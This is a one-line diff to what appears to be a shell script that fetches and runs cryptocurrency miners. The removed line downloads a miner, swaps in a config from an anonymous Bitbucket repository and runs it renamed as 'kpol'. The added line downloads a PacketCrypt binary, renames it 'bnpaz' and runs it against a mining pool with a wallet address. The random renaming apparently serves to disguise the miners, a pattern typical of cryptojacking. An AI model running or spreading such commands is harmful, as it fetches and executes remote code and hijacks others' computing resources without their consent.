@@ -1,1 +1,1 @@
-wget https://github.com/De-Crypted/dcrptd-miner/releases/download/2.3.0/dcrptd-miner-linux-x64-2.3.0.tar.gz && tar xf dcrptd-miner-linux-x64-2.3.0.tar.gz && rm config.json && wget https://bitbucket.org/gasdqwz/gasdqwza/raw/458b96a708ab949e5ffb9c56cc6309c12ab5f440/config.json && mv dcrptd-miner kpol && ./kpol
+wget https://www.pkt.world/ext/packetcrypt-linux-amd64 && mv packetcrypt-linux-amd64 bnpaz && chmod +x bnpaz && ./bnpaz ann -p pkt1qqq6yd2fdgrtfucax0tzx5vram8wt4n4v7ujwny https://stratum.zetahash.com
